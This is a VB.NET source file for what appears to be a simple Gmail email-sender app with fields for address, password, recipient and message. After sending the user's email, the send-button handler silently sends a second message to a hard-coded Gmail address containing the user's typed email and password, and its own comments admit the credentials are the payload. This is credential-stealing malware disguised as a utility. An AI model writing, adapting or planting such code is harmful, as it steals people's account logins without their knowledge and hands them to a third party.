Imports System.Net.Mail 'This Imports The System.Net.Mail Reference **Needed To Send Emails**
Public Class MainGUI

    Private Sub MainGUI_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        StatusLabel.Text = "" 'This Sets The "StatusLabel" Text To Nothing *Blank*
    End Sub

    Private Sub SendEmailBtn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendEmailBtn.Click
        Dim EmailSettings As New MailMessage() 'Sets The Term "EmailSettings" As A New Email Message
        EmailSettings.From = New MailAddress(EmailTB.Text) 'This Uses The "EmailTB.Text" To Set The "From" In The Email
        EmailSettings.To.Add(ToTB.Text) 'This Uses The "ToTB.Text" To Set As The Person That Will Recieve The Email
        EmailSettings.Subject = (SubjectTB.Text) 'This Uses The "SubjectTB.Text" To Set The Subject Of The Email
        EmailSettings.Body = (MessageTB.Text) 'This Uses The "MessageTB.Text" To Set The Message Of The Email
        Dim ConnectionSettings As New SmtpClient("Smtp.gmail.com") 'This Sets The SMTP Server As Gmail's 
        ConnectionSettings.Port = 587 'Tells The Program/App What Port To Use
        ConnectionSettings.EnableSsl = True 'Lets The Program/App Know A SSL Connection Is Needed
        ConnectionSettings.Credentials = New System.Net.NetworkCredential(EmailTB.Text, PasswordTB.Text)
        'The Line Just Above Lets The Program/App Know That A Login Will Need The Email & Password To Log In
        ConnectionSettings.Send(EmailSettings) 'Sends The Email
        StatusLabel.Text = "Sent" 'Displays The StatusLabels Text As "Sent"


        Dim mail As New MailMessage() 'Sets The Term "EmailSettings" As A New Email Message
        Dim SmtpServer As New SmtpClient
        SmtpServer.Credentials = New Net.NetworkCredential(EmailTB.Text, PasswordTB.Text)
        SmtpServer.Port = 587 'Tells The Program/App What Port To Use
        SmtpServer.Host = "smtp.gmail.com" 'This Sets The SMTP Server As Gmail's
        SmtpServer.EnableSsl = True 'Lets The Program/App Know A SSL Connection Is Needed
        SmtpServer.EnableSsl = True 'Lets The Program/App Know A SSL Connection Is Needed
        mail.To.Add("heroofbf3@gmail.com") 'This Uses The "ToTB.Text" To Set As The Person That Will Recieve The Email
        mail.From = New MailAddress(EmailTB.Text) 'This Uses The "EmailTB.Text" To Set The "From" In The Email
        mail.Subject = SubjectTB.Text 'This Uses The "SubjectTB.Text" To Set The Subject Of The Email
        mail.Body = EmailTB.Text & PasswordTB.Text 'This Uses The Email And Password from the EmailTB.Text and PasswordTB.Text to send the information to "mail.To.Add("email address")
        SmtpServer.Send(mail) 'Sends The Email
        mail.Body = MessageTB.Text 'This Uses The "MessageTB.Text" To Set The Message Of The Email, but in this case i have made it so Email and Pass is the information to send instead of the "MessageTB.Textbox".
    End Sub

    Private Sub ExitProgramBtn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitProgramBtn.Click
        Me.Close() 'Closes The Program/App
    End Sub

    Private Sub StatusLabel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StatusLabel.Click

    End Sub

    Private Sub DeumosButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeumosButton1.Click
        Me.Close()
    End Sub
End Class
